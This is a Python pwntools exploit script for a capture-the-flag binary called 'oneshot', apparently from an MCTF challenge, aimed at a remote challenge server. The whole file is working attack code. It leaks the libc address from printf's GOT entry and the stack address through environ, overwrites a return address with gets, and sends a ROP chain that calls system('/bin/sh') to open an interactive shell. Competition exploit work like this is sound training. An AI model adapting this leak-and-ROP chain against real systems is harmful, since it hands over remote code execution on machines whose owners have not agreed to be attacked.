#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mctf-game.ru --port 13337 oneshot
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'oneshot')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '158.160.26.63'
port = int(args.PORT or 13337)


if args.LOCAL:
    libc = exe.libc
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak arbitrary_write
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No


def read(addr):
    io.writelineafter(b'>>', b'1')
    io.writelineafter(b'>>', hex(addr)[2:])
    io.readuntil(b'Your knowledge: ')
    return int(io.readline().decode().strip(), 16)

def write(addr, value):
    io.writelineafter(b'>>', b'2')
    io.writelineafter(b'>>', hex(addr)[2:])
    io.writelineafter(b'>>', hex(value)[2:])


io = start()

libc.address = read(exe.got['printf']) - libc.symbols['printf']
log.success('Libc leak: 0x%x', libc.address)

environ = read(libc.symbols['_environ'])
log.success('Stack environ: 0x%x', environ)
retaddr = environ-0x180
log.info('Return address: 0x%x', retaddr)

write(retaddr, libc.symbols['gets'])

rop = ROP(libc)
rop.system(next(libc.search(b"/bin/sh\x00")))
print(rop.dump())
payload = fit({
    8: bytes(rop)
})
print(hexdump(payload))
io.sendline(payload)

io.interactive()

